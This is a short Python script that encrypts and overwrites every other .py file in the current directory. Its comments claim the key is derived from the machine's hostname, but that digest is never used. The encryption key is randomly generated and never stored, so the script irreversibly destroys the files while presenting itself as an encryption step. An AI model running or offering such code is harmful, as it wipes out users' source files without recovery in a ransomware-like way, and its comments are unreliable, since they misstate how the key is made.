import os
import socket
import hashlib
from cryptography.fernet import Fernet

# Step 1: Get the hostname of the machine
hostname = socket.gethostname()

# Step 2: Generate a key based on the hostname
key = hashlib.sha256(hostname.encode()).digest()
cipher_suite = Fernet(Fernet.generate_key())

# Step 3: Encrypt and overwrite all .py files in the directory
for filename in os.listdir():
    if filename.endswith('.py') and filename != 'encrypt_files.py':  # Exclude this encryption script itself
        with open(filename, 'rb') as file:
            original_code = file.read()

        encrypted_code = cipher_suite.encrypt(original_code)

        # Overwrite the original file with the encrypted content
        with open(filename, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_code)

print("All Python files have been encrypted and saved under their original filenames.")
